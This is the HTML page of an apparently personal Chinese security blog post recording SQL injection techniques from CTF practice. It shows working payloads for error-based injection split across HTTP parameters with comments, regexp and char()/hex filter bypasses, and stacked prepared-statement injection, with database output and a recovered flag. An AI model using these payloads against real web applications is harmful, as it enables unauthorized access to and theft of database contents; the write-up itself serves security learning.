@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>sql注入 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言注入千百样，本文仅记录一些姿势供个人查阅。轻喷。 HTTP分割注入题目地址实验吧：加了料的报错注入。地址：http://ctf5.shiyanbar.com/web/baocuo/index.php  查看页面源代码，给出了我们sql查询语句很常规 &amp;lt;!-- $sql=&amp;quot;select * from users where username=&amp;apos;$username&amp;apo">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入">
+<meta property="og:url" content="http://yoursite.com/2018/12/03/sql注入/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言注入千百样，本文仅记录一些姿势供个人查阅。轻喷。 HTTP分割注入题目地址实验吧：加了料的报错注入。地址：http://ctf5.shiyanbar.com/web/baocuo/index.php  查看页面源代码，给出了我们sql查询语句很常规 &amp;lt;!-- $sql=&amp;quot;select * from users where username=&amp;apos;$username&amp;apo">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://m.qpic.cn/psb?/V14K5DCn0YAkcr/hM1RxRZ4qdSGafHA6s7uXUMdGnBa6U2Jb.rkqC2NQ8s!/b/dDYBAAAAAAAA&bo=GQPdAAAAAAADF*U!&rf=viewer_4">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1559184520.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1559185099.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1559186303.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1559186526.jpg">
+<meta property="og:updated_time" content="2019-05-30T03:47:22.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sql注入">
+<meta name="twitter:description" content="前言注入千百样，本文仅记录一些姿势供个人查阅。轻喷。 HTTP分割注入题目地址实验吧：加了料的报错注入。地址：http://ctf5.shiyanbar.com/web/baocuo/index.php  查看页面源代码，给出了我们sql查询语句很常规 &amp;lt;!-- $sql=&amp;quot;select * from users where username=&amp;apos;$username&amp;apo">
+<meta name="twitter:image" content="http://m.qpic.cn/psb?/V14K5DCn0YAkcr/hM1RxRZ4qdSGafHA6s7uXUMdGnBa6U2Jb.rkqC2NQ8s!/b/dDYBAAAAAAAA&bo=GQPdAAAAAAADF*U!&rf=viewer_4">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-sql注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/12/03/sql注入/" class="article-date">
+  <time datetime="2018-12-02T16:00:00.000Z" itemprop="datePublished">2018-12-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      sql注入
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>注入千百样，本文仅记录一些姿势供个人查阅。轻喷。</p>
+<h1 id="HTTP分割注入"><a href="#HTTP分割注入" class="headerlink" title="HTTP分割注入"></a>HTTP分割注入</h1><p>题目地址实验吧：加了料的报错注入。<br>地址：<a href="http://ctf5.shiyanbar.com/web/baocuo/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/baocuo/index.php</a></p>
+<p><img src="http://m.qpic.cn/psb?/V14K5DCn0YAkcr/hM1RxRZ4qdSGafHA6s7uXUMdGnBa6U2Jb.rkqC2NQ8s!/b/dDYBAAAAAAAA&bo=GQPdAAAAAAADF*U!&rf=viewer_4" alt></p>
+<p>查看页面源代码，给出了我们sql查询语句很常规</p>
+<pre><code>&lt;!-- $sql=&quot;select * from users where username=&apos;$username&apos; and password=&apos;$password&apos;&quot;;  --&gt;</code></pre><p>根据提示 post传一个username和password然后开始注入</p>
+<p>语句：</p>
+<pre><code>username=admin&apos; or &apos;&amp;password=admin</code></pre><p>显示 You are our member, welcome to enter，可以说明单引号空格没有被过滤，不过既然是报错注入，那么加个单引号试试。</p>
+<p>语句：</p>
+<pre><code>username=admin&apos;&amp;password=admin</code></pre><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘admin’’ at line 1</p>
+<p>接下来写报错语句<br>语句：</p>
+<pre><code>username=admin&apos;and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &apos;&amp;password=admin</code></pre><p>一翻测试之后发现,有个神奇的过滤，username过滤了（），password过滤了一切报错函数。</p>
+<p>可以组合一下。username写函数updatexml。password写（），但是怎么合并为一起呢，想到sql语句是  </p>
+<pre><code>select * from users where username=&apos;$username&apos; and password=&apos;$password  
+$username=updatexm/*,$password=*/...这样sql语句会变成
+
+select * from users where username=&apos;updatexm/* and password=&apos;*/...</code></pre><p>这样便可以注释掉中间的代码一种骚姿势，接下来继续正常注入。</p>
+<pre><code>username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select database()),0x7e),1) or &apos;</code></pre><p><img src="http://47.106.185.69/1/./img/1559184520.jpg" alt></p>
+<p>成功爆出来数据库名称。</p>
+<p>语句</p>
+<pre><code>username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select table_name from information_schema.tables where table_schema =&apos;error_based_hpf&apos;),0x7e),1) or &apos;</code></pre><p>=号被过滤，可以使用正则注入，也就是=换成regexp</p>
+<pre><code>username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema regexp&apos;error_based_hpf&apos;),0x7e),1) or &apos;</code></pre><p>这里使用group_concat来爆出所有的表名字</p>
+<pre><code>XPATH syntax error: &apos;~ffll44jj,users~&apos;</code></pre><p>查列</p>
+<pre><code>username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name regexp&apos;ffll44jj&apos;),0x7e),1) or &apos;
+
+XPATH syntax error: &apos;~value~&apos;</code></pre><p>查数据</p>
+<pre><code>username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select value from 
+ffll44jj),0x7e),1) or &apos;
+
+XPATH syntax error: &apos;~flag{err0r_b4sed_sqli_+_hpf}~&apos;</code></pre><p>如果flag超过32位，可以mid截断来查询。不过本题中是禁止了mid函数的不过也不超过32位可以直接获取flag。</p>
+<h1 id="堆叠预编译注入"><a href="#堆叠预编译注入" class="headerlink" title="堆叠预编译注入"></a>堆叠预编译注入</h1><p>首先了解下预处理语句</p>
+<pre><code>预制语句的SQL语法基于三个SQL语句：
+
+PREPARE stmt_name FROM preparable_stmt;
+
+EXECUTE stmt_name [USING @var_name [, @var_name] ...];
+
+{DEALLOCATE | DROP} PREPARE stmt_name;</code></pre><p>对于不确定参数以问号代替，然后using加入参数即可。</p>
+<p><img src="http://47.106.185.69/1/./img/1559185099.jpg" alt></p>
+<p>预处理语句可以和正常查询一样，但是查询方式稍有变化，在一些绕过中可以利用这种机制来进行sql注入。</p>
+<p>堆叠注入</p>
+<p>在一条sql语句执行完毕后，使用分号结尾，然后利用多条语句执行特性，然后完整攻击。</p>
+<p>简单的堆叠查询。</p>
+<p><img src="http://47.106.185.69/1/./img/1559186303.jpg" alt></p>
+<pre><code>mysql&gt; set @a=&apos;select * from user where id =1&apos;;prepare stmt from @a;execute stmt;
+Query OK, 0 rows affected (0.00 sec)
+
+Query OK, 0 rows affected (0.00 sec)
+Statement prepared
+
++----+------------------+------------------+----------------------------------+---------------------------------------------------------------------------------+
+| ID | username         | email            | password                         | img                                                                             |
++----+------------------+------------------+----------------------------------+---------------------------------------------------------------------------------+
+|  1 | 275640346@qq.com | 275640346@qq.com | 20905fe3160505df06abf12bfc8294fa | ../upload/54223df3e0247c41ce29176d227f95cf/ae566253288191ce5d879e51dae1d8c3.png |
++----+------------------+------------------+----------------------------------+---------------------------------------------------------------------------------+
+1 row in set (0.00 sec)</code></pre><p>利用mysql的特性对十六进制也可进行查询。</p>
+<p><img src="http://47.106.185.69/1/./img/1559186526.jpg" alt></p>
+<p>如果对prepare excute等关键词无过滤便可以用这个特性绕过很多关键词来达到sql注入效果。</p>
+<p>或者ascii来解码进行注入</p>
+<p>mysql&gt; set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(100),char(97),char(116),char(97),char(98),char(97),char(115),char(101),char(40),char(41)); prepare a from @s;execute a;<br>Query OK, 0 rows affected (0.00 sec)</p>
+<p>Query OK, 0 rows affected (0.00 sec)<br>Statement prepared</p>
+<pre><code>+------------+
+| database() |
++------------+
+| qwb        |
++------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(100),char(97),char(116),char(97),char(98),char(97),char(115),char(101),char(40),char(41));
++---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(100),char(97),char(116),char(97),char(98),char(97),char(115),char(101),char(40),char(41)) |
++---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| select database()                                                                                                                                                         |
++---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</code></pre><p>1 row in set (0.00 sec)</p>
+<p>参考强网杯web-随便注</p>
+<pre><code>https://k-ring.github.io/2019/05/28/%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwriteup/</code></pre>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/12/03/sql注入/" data-id="ck0l0oh9k0014py2iafig5o5b" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/12/04/git工具的使用/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          git使用与部署github
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/12/02/web漏洞越权/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">web漏洞之越权</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web漏洞/">web漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/杂/">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透攻防/">渗透攻防</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/python/" style="font-size: 14px;">python</a> <a href="/tags/web漏洞/" style="font-size: 18px;">web漏洞</a> <a href="/tags/杂/" style="font-size: 16px;">杂</a> <a href="/tags/渗透攻防/" style="font-size: 12px;">渗透攻防</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/06/25/csp内容安全策略/">csp内容安全策略</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/25/thinkphp3.2.3/">thinkphp框架学习</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/17/url跳转实战/">渗透之url跳转</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/20/反序列化学习/">PHP反序列化学习</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/14/2019DDCTF/">2019DDCTF</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
